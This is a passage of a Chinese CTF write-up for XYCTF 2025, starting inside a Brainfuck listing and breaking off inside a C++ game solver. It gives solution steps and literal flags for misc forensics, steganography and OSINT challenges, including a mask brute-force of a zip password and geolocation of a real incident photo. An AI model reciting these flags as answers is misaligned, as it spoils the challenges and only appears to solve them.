class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]</code></pre>\n\n<p>flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>\n<h3 id=\"曼波曼波曼波\"><a href=\"#曼波曼波曼波\" class=\"headerlink\" title=\"曼波曼波曼波\"></a>曼波曼波曼波</h3><p>smn.txt的base64逆序，后发现jpg文件头，保存为文件</p>\n<p><img src=\"/images/download-1744626745339-68.jpg\" loading=\"lazy\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t</p>\n<p>010查看发现后面跟了PK，binwalk分解得到压缩包</p>\n<p>提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份</p>\n<p>还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025</p>\n<p>给了两张一样的图片，双图盲水印秒了</p>\n<p><img src=\"/images/EASY_1_decpy3-1744626745339-69.png\" loading=\"lazy\"></p>\n<h3 id=\"MADer也要当CTFer\"><a href=\"#MADer也要当CTFer\" class=\"headerlink\" title=\"MADer也要当CTFer\"></a>MADer也要当CTFer</h3><p>提取mkv文件的字幕轨subs.ass</p>\n<p>发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件</p>\n<p>使用ae打开，发现有图层</p>\n<p><img src=\"/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png\" loading=\"lazy\"></p>\n<p>取消设置隐藏”消隐”的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。</p>\n<p><img src=\"/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png\" loading=\"lazy\"></p>\n<p>flag{l_re@IIy_w@nn@_2_Ie@rn_AE}</p>\n<h3 id=\"会飞的雷克萨斯\"><a href=\"#会飞的雷克萨斯\" class=\"headerlink\" title=\"会飞的雷克萨斯\"></a>会飞的雷克萨斯</h3><p>看图猜到是之前小孩炸车事件，直接百度该事件。</p>\n<p><img src=\"/images/QQ_1743832187198-1744626745339-71.png\" loading=\"lazy\"></p>\n<p>得到地址：四川省内江市资中县春岚北路</p>\n<p>后面XXXXXX内通过地图看应该是中铁城市中心</p>\n<p><img src=\"/images/QQ_1743832241003-1744626745339-73.png\" loading=\"lazy\"></p>\n<p>flag{四川省内江市资中县春岚北路中铁城市中心内}</p>\n<h3 id=\"XGCTF\"><a href=\"#XGCTF\" class=\"headerlink\" title=\"XGCTF\"></a>XGCTF</h3><p>搜索关键词找到题目名称：<strong>easy_polluted</strong></p>\n<p><img src=\"/images/QQ_1743832317067-1744626745339-74.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png\" loading=\"lazy\"></p>\n<p>github可以搜到dragonkeep</p>\n<p>通过访问他的.github.io会重定位到</p>\n<p><img src=\"/images/QQ_1743832409731-1744626745339-76.png\" loading=\"lazy\"></p>\n<p>找到第一篇文章。</p>\n<p><img src=\"/images/QQ_1743832453654-1744626745339-75.png\" loading=\"lazy\"></p>\n<p>f12找到flag进行base64解密。</p>\n<p><img src=\"/images/QQ_1743832482740-1744626745339-77.png\" loading=\"lazy\">flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}</p>\n<h3 id=\"Greedymen\"><a href=\"#Greedymen\" class=\"headerlink\" title=\"Greedymen\"></a>Greedymen</h3><p>将题目和思路发给claude写出计算优解代码</p>\n<p>思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字</p>\n<p>算法代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;set></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;algorithm></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;map></span></span>\n\n<span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span>\n\nvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> factors<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            factors<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> factors<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">bool</span> <span class=\"token function\">isPrime</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">*</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Evaluation</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> immediateGain<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> futureImpact<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> numFactors<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">bool</span> <span class=\"token keyword\">operator</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Evaluation <span class=\"token operator\">&amp;</span>other<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>immediateGain <span class=\"token operator\">!=</span> other<span class=\"token punctuation\">.</span>immediateGain<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> immediateGain <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>immediateGain<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>futureImpact <span class=\"token operator\">!=</span> other<span class=\"token punctuation\">.</span>futureImpact<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> futureImpact <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>futureImpact<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> numFactors <span class=\"token operator\">></span> other<span class=\"token punctuation\">.</span>numFactors<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> NEG_INF <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1000000000</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 使用整数常量</span>\n\nEvaluation <span class=\"token function\">evaluateChoice</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token operator\">&amp;</span>usedNumbers<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> maxNum<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> factors <span class=\"token operator\">=</span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> opponentGain <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> newUsed <span class=\"token operator\">=</span> usedNumbers<span class=\"token punctuation\">;</span>\n    newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> factor <span class=\"token operator\">:</span> factors<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>factor <span class=\"token operator\">!=</span> num <span class=\"token operator\">&amp;&amp;</span> usedNumbers<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> usedNumbers<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            opponentGain <span class=\"token operator\">+=</span> factor<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">int</span> futureOptions <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> maxNum<span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> iFactors <span class=\"token operator\">=</span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">bool</span> hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> f <span class=\"token operator\">:</span> iFactors<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">!=</span> i <span class=\"token operator\">&amp;&amp;</span> newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hasUnusedFactor<span class=\"token punctuation\">)</span>\n                futureOptions<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span>num <span class=\"token operator\">-</span> opponentGain<span class=\"token punctuation\">,</span> futureOptions<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>factors<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> maxNum<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> moves<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> used<span class=\"token punctuation\">;</span>\n    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> choices<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> myScore <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> opponentScore <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> factorMap<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 预计算所有数的因数</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> maxNum<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        factorMap<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>moves <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">int</span> bestNum <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        Evaluation bestEval <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>NEG_INF<span class=\"token punctuation\">,</span> NEG_INF<span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span 